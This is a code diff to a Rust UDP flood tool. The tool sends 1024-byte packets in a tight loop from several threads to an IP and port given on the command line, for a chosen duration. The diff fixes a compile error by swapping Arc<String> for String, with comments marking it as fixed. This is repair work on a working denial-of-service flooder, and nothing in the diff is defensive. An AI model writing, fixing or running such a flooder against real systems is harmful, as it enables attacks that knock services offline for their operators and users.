@@ -7,7 +7,7 @@ use std::time::{Instant, Duration};
 const PACKET_SIZE: usize = 1024;
 
 struct ThreadArgs {
-    server_addr: Arc<String>,
+    server_addr: String,  // Store as a normal String, not Arc<String>
     end_time: Instant,
 }
 
@@ -15,9 +15,9 @@ struct ThreadArgs {
 async fn udp_flood(args: Arc<ThreadArgs>) {
     let socket = UdpSocket::bind("0.0.0.0:0").await.expect("Socket creation failed");
     let packet = vec![b'A'; PACKET_SIZE];
-    
+
     while Instant::now() < args.end_time {
-        let _ = socket.send_to(&packet, &args.server_addr).await;
+        let _ = socket.send_to(&packet, args.server_addr.as_str()).await; // ✅ FIXED: Convert String to &str
     }
 }
 
@@ -35,7 +35,7 @@ async fn main() {
     let duration: u64 = args[4].parse().expect("Invalid duration");
     let end_time = Instant::now() + Duration::from_secs(duration);
 
-    let server_addr = Arc::new(format!("{}:{}", ip, port));
+    let server_addr = format!("{}:{}", ip, port); // Store as normal String, not Arc<String>
     let thread_args = Arc::new(ThreadArgs { server_addr, end_time });
 
     println!("Starting UDP flood on {}:{} for {} seconds using {} threads.", ip, port, duration, threads);
